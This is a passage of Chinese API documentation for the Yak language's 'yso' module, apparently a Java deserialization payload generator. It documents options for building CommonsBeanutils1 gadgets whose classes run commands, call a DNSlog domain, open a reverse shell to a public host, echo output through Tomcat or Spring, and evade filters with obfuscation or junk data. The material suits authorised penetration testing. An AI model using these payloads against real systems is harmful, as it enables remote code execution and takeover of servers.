``````````````yak
classObj, _ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(), yso.useParam("Body Echo Check"))
bcelStr, err = yso.ToBcel(classObj)
``````````````

---

### ToJson {#tojson}

```go
ToJson(i any) (string, error)
```

将 Java 或反序列化对象转换为 json 字符串

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| i | `any` | Java 类对象或反序列化对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `string` | json 字符串 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetJson,_ = yso.ToJson(gadgetObj)
``````````````

---

### command {#command}

```go
command(cmd string) GenClassOptionFun
```

SetExecCommand

command 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要执行的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())
``````````````

---

### dirtyDataLength {#dirtydatalength}

```go
dirtyDataLength(length int) MarshalOptionFun
```

SetToBytesDirtyDataLength 设置序列化数据中脏数据的长度

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| length | `int` | 要设置的脏数据长度 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `MarshalOptionFun` | 用于配置序列化的选项函数 |

**示例**

``````````````yak
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000))
``````````````

---

### dnslogDomain {#dnslogdomain}

```go
dnslogDomain(addr string) GenClassOptionFun
```

SetDnslog

dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| addr | `string` | 要设置的 Dnslog 域名 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
``````````````

---

### dump {#dump}

```go
dump(i any) (string, error)
```

将Java 对象转换为类 Java 代码

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| i | `any` | Java 类对象或反序列化对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `string` | 类 Java 代码字符串 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetDump,_ = yso.dump(gadgetObj)
``````````````

---

### evilClassName {#evilclassname}

```go
evilClassName(className string) GenClassOptionFun
```

SetClassName

evilClassName 请求参数选项函数，用于设置生成的类名。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| className | `string` | 要设置的类名 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
``````````````

---

### majorVersion {#majorversion}

```go
majorVersion(v uint16) GenClassOptionFun
```

SetMajorVersion

majorVersion 请求参数选项函数，用于设置生成的 Java 类文件的 major 版本号(取值范围 45-62，超出范围回退为 52)。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| v | `uint16` | Java 类文件的 major 版本号，取值范围 45-62 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"),yso.majorVersion(52))
``````````````

---

### obfuscationClassConstantPool {#obfuscationclassconstantpool}

```go
obfuscationClassConstantPool() GenClassOptionFun
```

SetObfuscation

obfuscationClassConstantPool 请求参数选项函数，用于设置是否混淆类常量池。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.obfuscationClassConstantPool())
``````````````

---

### springEchoBody {#springechobody}

```go
springEchoBody() GenClassOptionFun
```

SetEchoBody

springEchoBody 请求参数选项函数，设置是否要在body中回显。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
``````````````

---

### springHeader {#springheader}

```go
springHeader(key string, val string) GenClassOptionFun
```

SetHeader

springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。

需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| key | `string` | 要设置的 header 键 |
| val | `string` | 要设置的 header 值 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
``````````````

---

### springParam {#springparam}

```go
springParam(val string) GenClassOptionFun
```

SetParam

springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| val | `string` | 要设置的回显值/请求参数 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
``````````````

---

### springRuntimeExecAction {#springruntimeexecaction}

```go
springRuntimeExecAction() GenClassOptionFun
```

SetExecAction

springRuntimeExecAction 请求参数选项函数，设置是否要执行命令。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
``````````````

---

### tcpReverseHost {#tcpreversehost}

```go
tcpReverseHost(host string) GenClassOptionFun
```

SetTcpReverseHost

tcpReverseHost 请求参数选项函数，设置指定的 tcpReverseHost 域名，需要配合 useTcpReverseTemplate ，tcpReversePort 使用。

还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| host | `string` | 要设置的 tcpReverseHost 的 host |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
``````````````

---

### tcpReversePort {#tcpreverseport}

```go
tcpReversePort(port int) GenClassOptionFun
```

SetTcpReversePort

tcpReversePort 请求参数选项函数，设置指定的 tcpReversePort 域名，需要配合 useTcpReverseTemplate ，tcpReverseHost 使用。

还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| port | `int` | 要设置的 tcpReversePort 的 port |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
``````````````

---

### tcpReverseToken {#tcpreversetoken}

```go
tcpReverseToken(token string) GenClassOptionFun
```

SetTcpReverseToken

tcpReverseToken 请求参数选项函数，设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| token | `string` | 要设置的 token |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
``````````````

---

### threeBytesCharString {#threebytescharstring}

```go
threeBytesCharString() MarshalOptionFun
```

SetToBytesThreeBytesString 设置序列化时使用三字节字符串

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `MarshalOptionFun` | 用于配置序列化的选项函数 |

**示例**

``````````````yak
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.threeBytesCharString())
``````````````

---

### twoBytesCharString {#twobytescharstring}

```go
twoBytesCharString() MarshalOptionFun
```

SetToBytesTwoBytesString 设置序列化时使用双字节字符串

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `MarshalOptionFun` | 用于配置序列化的选项函数 |

**示例**

``````````````yak
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.twoBytesCharString())
``````````````

---

### useBase64BytesClass {#usebase64bytesclass}

```go
useBase64BytesClass(base64 string) GenClassOptionFun
```

SetClassBase64Bytes

useBase64BytesClass 请求参数选项函数，传入base64编码的字节码。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| base64 | `string` | base64 编码的字节码 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBase64BytesClass(base64Class))
``````````````

---

### useBytesClass {#usebytesclass}

```go
useBytesClass(data []byte) GenClassOptionFun
```

SetClassBytes

useBytesClass 请求参数选项函数，传入字节码。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| data | `[]byte` | 字节码 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
bytesCode,_ =codec.DecodeBase64(bytes)
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesClass(bytesCode))
``````````````

---

### useBytesEvilClass {#usebytesevilclass}

```go
useBytesEvilClass(data []byte) GenClassOptionFun
```

SetBytesEvilClass

useBytesEvilClass 请求参数选项函数，传入自定义的字节码。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| data | `[]byte` | 自定义的字节码 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
bytesCode,_ =codec.DecodeBase64(bytes)
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode))
``````````````

---

### useClassMultiEchoTemplate {#useclassmultiechotemplate}

```go
useClassMultiEchoTemplate() GenClassOptionFun
```

SetClassMultiEchoTemplate

useClassMultiEchoTemplate 请求参数选项函数，用于设置生成 MultiEcho 类的模板，主要用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例：MultiEcho 模板的 body 回显**

``````````````yak
bodyClassObj, _ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(), yso.useEchoBody(), yso.useParam("Body Echo Check"))
``````````````

**示例：MultiEcho 模板的 header 回显**

``````````````yak
headerClassObj, _ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(), yso.useHeaderParam("Echo", "Header Echo Check"))
``````````````

---

### useClassParam {#useclassparam}

```go
useClassParam(k string, v string) GenClassOptionFun
```

SetClassParam 设置类生成时的参数

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| k | `string` | 参数名 |
| v | `string` | 参数值 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
classObj,_ = yso.GenerateClass(yso.useClassParam("command","whoami"))
``````````````

---

### useConstructorExecutor {#useconstructorexecutor}

```go
useConstructorExecutor() GenClassOptionFun
```

SetConstruct

useConstructorExecutor 请求参数选项函数，用于设置是否使用构造器执行。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.useConstructorExecutor())
``````````````

---

### useDNSLogEvilClass {#usednslogevilclass}

```go
useDNSLogEvilClass(addr string) GenClassOptionFun
```

SetDnslogEvilClass

useDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| addr | `string` | 要设置的 Dnslog 域名 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
``````````````

---

### useDNSlogTemplate {#usednslogtemplate}

```go
useDNSlogTemplate() GenClassOptionFun
```

SetClassDnslogTemplate

useDnslogTemplate 请求参数选项函数，用于设置生成Dnslog类的模板，需要配合 dnslogDomain 使用。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
``````````````

---

### useEchoBody {#useechobody}

```go
useEchoBody() GenClassOptionFun
```

SetEchoBody

springEchoBody 请求参数选项函数，设置是否要在body中回显。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
``````````````

---

### useHeaderEchoEvilClass {#useheaderechoevilclass}

```go
useHeaderEchoEvilClass() GenClassOptionFun
```

SetHeaderEchoEvilClass

useHeaderEchoEvilClass 请求参数选项函数，设置 HeaderEcho 类，需要配合 useHeaderParam 使用。

和 useHeaderEchoTemplate 的功能一样

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
``````````````

---

### useHeaderEchoTemplate {#useheaderechotemplate}

```go
useHeaderEchoTemplate() GenClassOptionFun
```

SetClassHeaderEchoTemplate

useHeaderEchoTemplate 请求参数选项函数，用于设置生成HeaderEcho类的模板，需要配合 useHeaderParam 使用。

自动查找Response对象并在header中回显指定内容，需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
``````````````

---

### useHeaderParam {#useheaderparam}

```go
useHeaderParam(key string, val string) GenClassOptionFun
```

SetHeader

springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。

需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| key | `string` | 要设置的 header 键 |
| val | `string` | 要设置的 header 值 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
``````````````

---

### useModifyTomcatMaxHeaderSizeTemplate {#usemodifytomcatmaxheadersizetemplate}

```go
useModifyTomcatMaxHeaderSizeTemplate() GenClassOptionFun
```

SetClassModifyTomcatMaxHeaderSizeTemplate

useModifyTomcatMaxHeaderSizeTemplate 请求参数选项函数，用于设置生成ModifyTomcatMaxHeaderSize类的模板。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useModifyTomcatMaxHeaderSizeTemplate())
``````````````

---

### useMultiEchoEvilClass {#usemultiechoevilclass}

```go
useMultiEchoEvilClass() GenClassOptionFun
```

SetMultiEchoEvilClass

useMultiEchoEvilClass 请求参数选项函数，设置 MultiEcho 类，主要用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。

和 useClassMultiEchoTemplate 的功能一样

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例：MultiEcho 恶意类的 body 回显**

``````````````yak
bodyClassObj, _ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(), yso.useEchoBody(), yso.useParam("Body Echo Check"))
``````````````

**示例：MultiEcho 恶意类的 header 回显**

``````````````yak
headerClassObj, _ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(), yso.useHeaderParam("Echo", "Header Echo Check"))
``````````````

---

### useParam {#useparam}

```go
useParam(val string) GenClassOptionFun
```

SetParam

springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| val | `string` | 要设置的回显值/请求参数 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
``````````````

---

### useProcessBuilderExecEvilClass {#useprocessbuilderexecevilclass}

```go
useProcessBuilderExecEvilClass(cmd string) GenClassOptionFun
```

SetProcessBuilderExecEvilClass

useProcessBuilderExecEvilClass 请求参数选项函数，设置生成ProcessBuilderExec类的模板，同时设置要执行的命令。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要执行的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
``````````````

---

### useProcessBuilderExecTemplate {#useprocessbuilderexectemplate}

```go
useProcessBuilderExecTemplate() GenClassOptionFun
```

SetClassProcessBuilderExecTemplate

useProcessBuilderExecTemplate 请求参数选项函数，用于设置生成ProcessBuilderExec类的模板，需要配合 command 使用。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecTemplate(),yso.command("whoami"))
``````````````

---

### useProcessImplExecEvilClass {#useprocessimplexecevilclass}

```go
useProcessImplExecEvilClass(cmd string) GenClassOptionFun
```

SetProcessImplExecEvilClass

useProcessImplExecEvilClass 请求参数选项函数，设置生成ProcessImplExec类的模板，同时设置要执行的命令。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要执行的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
``````````````

---

### useProcessImplExecTemplate {#useprocessimplexectemplate}

```go
useProcessImplExecTemplate() GenClassOptionFun
```

SetClassProcessImplExecTemplate

useProcessImplExecTemplate 请求参数选项函数，用于设置生成ProcessImplExec类的模板，需要配合command使用。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecTemplate(),yso.command("whoami"))
``````````````

---

### useRuntimeExecEvilClass {#useruntimeexecevilclass}

```go
useRuntimeExecEvilClass(cmd string) GenClassOptionFun
```

SetRuntimeExecEvilClass

useRuntimeExecEvilClass 请求参数选项函数，设置生成RuntimeExec类的模板，同时设置要执行的命令。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要执行的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
``````````````

---

### useRuntimeExecTemplate {#useruntimeexectemplate}

```go
useRuntimeExecTemplate() GenClassOptionFun
```

SetClassRuntimeExecTemplate

useRuntimeExecTemplate 请求参数选项函数，用于设置生成RuntimeExec类的模板，需要配合 command 使用。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecTemplate(),yso.command("whoami"))
``````````````

---

### useSleepEvilClass {#usesleepevilclass}

```go
useSleepEvilClass() GenClassOptionFun
```

SetSleepEvilClass

useSleepEvilClass 请求参数选项函数，设置 Sleep 类，需要配合 useSleepTime 使用。

和 useSleepTemplate 的功能一样

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSleepEvilClass(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
``````````````

---

### useSleepTemplate {#usesleeptemplate}

```go
useSleepTemplate() GenClassOptionFun
```

SetClassSleepTemplate

useSleepTemplate 请求参数选项函数，用于设置生成 Sleep 类的模板，需要配合 useSleepTime 使用，主要用与指定 sleep 时长，用于延时检测gadget。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
``````````````

---

### useSleepTime {#usesleeptime}

```go
useSleepTime(time int) GenClassOptionFun
```

SetSleepTime

useSleepTime 请求参数选项函数，设置指定的 sleep 时长，需要配合 useSleepTemplate 使用，主要用与指定 sleep 时长，用于延时检测gadget。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| time | `int` | sleep 时长，单位秒 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
``````````````

---

### useSpringEchoTemplate {#usespringechotemplate}

```go
useSpringEchoTemplate() GenClassOptionFun
```

SetClassSpringEchoTemplate

useSpringEchoTemplate 请求参数选项函数，用于设置生成SpringEcho类的模板，需要配合 springHeader 或 springParam 使用。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
``````````````

---

### useTcpReverseEvilClass {#usetcpreverseevilclass}

```go
useTcpReverseEvilClass(host string, port int) GenClassOptionFun
```

SetTcpReverseEvilClass

useTcpReverseEvilClass 请求参数选项函数，设置生成TcpReverse类的模板，同时设置指定的 tcpReverseHost ，tcpReversePort。

相当于 useTcpReverseTemplate ，tcpReverseHost  两个个函数的组合。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| host | `string` | 要设置的 tcpReverseHost 的 host |
| port | `int` | 要设置的 tcpReversePort 的 port |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host,8080),yso.tcpReverseToken(token))
``````````````

---

### useTcpReverseShellEvilClass {#usetcpreverseshellevilclass}

```go
useTcpReverseShellEvilClass(host string, port int) GenClassOptionFun
```

SetTcpReverseShellEvilClass

useTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。

相当于 useTcpReverseShellTemplate ，tcpReverseShellHost，tcpReverseShellPort  三个个函数的组合。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| host | `string` | 要设置的 tcpReverseShellHost 的 host |
| port | `int` | 要设置的 tcpReverseShellPort 的 port |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
host = "公网IP"
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
``````````````

---

### useTcpReverseShellTemplate {#usetcpreverseshelltemplate}

```go
useTcpReverseShellTemplate() GenClassOptionFun
```

SetClassTcpReverseShellTemplate

useTcpReverseShellTemplate 请求参数选项函数，用于设置生成TcpReverseShell类的模板，需要配合 tcpReverseShellHost 和 tcpReverseShellPort 使用。

该参数与 useTcpReverseTemplate 的区别是，该参数生成的类会在反连成功后，执行一个反弹shell。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
host = "公网IP"
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellTemplate(),yso.tcpReverseShellHost(host),yso.tcpReverseShellPort(8080))
``````````````

---

### useTcpReverseTemplate {#usetcpreversetemplate}

```go
useTcpReverseTemplate() GenClassOptionFun
```

SetClassTcpReverseTemplate

useTcpReverseTemplate 请求参数选项函数，用于设置生成TcpReverse类的模板，需要配合 tcpReverseHost 和 tcpReversePort 使用。

还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
``````````````

---

### useTemplate {#usetemplate}

```go
useTemplate(t ClassType) GenClassOptionFun
```

SetClassType 设置要生成的类类型

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| t | `ClassType` | 类类型 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例**

``````````````yak
classObj,_ = yso.GenerateClass(yso.useTemplate("RuntimeExec"))
``````````````

---

### useTomcatEchoEvilClass {#usetomcatechoevilclass}

```go
useTomcatEchoEvilClass() GenClassOptionFun
```

SetTomcatEchoEvilClass

useTomcatEchoEvilClass 请求参数选项函数，设置 TomcatEcho 类，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。

和 useTomcatEchoTemplate 的功能一样

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例：Tomcat 恶意类的 body 回显**

``````````````yak
bodyClassObj, _ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(), yso.useEchoBody(), yso.useParam("Body Echo Check"))
``````````````

**示例：Tomcat 恶意类的 header 回显**

``````````````yak
headerClassObj, _ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(), yso.useHeaderParam("Echo", "Header Echo Check"))
``````````````

---

### useTomcatEchoTemplate {#usetomcatechotemplate}

```go
useTomcatEchoTemplate() GenClassOptionFun
```

SetClassTomcatEchoTemplate

useTomcatEchoTemplate 请求参数选项函数，用于设置生成TomcatEcho类的模板，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |

**示例：Tomcat 模板的 body 回显**

``````````````yak
